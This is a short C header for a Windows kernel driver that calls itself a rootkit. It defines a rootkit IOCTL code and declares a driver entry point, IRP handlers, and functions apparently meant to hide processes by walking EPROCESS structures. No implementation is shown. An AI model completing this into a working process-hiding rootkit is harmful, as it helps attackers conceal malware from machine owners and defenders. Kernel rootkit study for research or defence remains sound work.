#pragma once
#pragma warning(disable: 4201)

#include <stdio.h>
#include <stdlib.h>
#include <Ntifs.h>
#include <ntddk.h>
#include <winapifamily.h> 
#include <ntimage.h>
#include <stdarg.h>

#define IRP_ROOTKIT_CODE 0x815

#define PROCAMOUNT 3

DRIVER_INITIALIZE DriverEntry;
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

NTSTATUS hidep();
ULONG find_eproc_pid();

NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage);
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);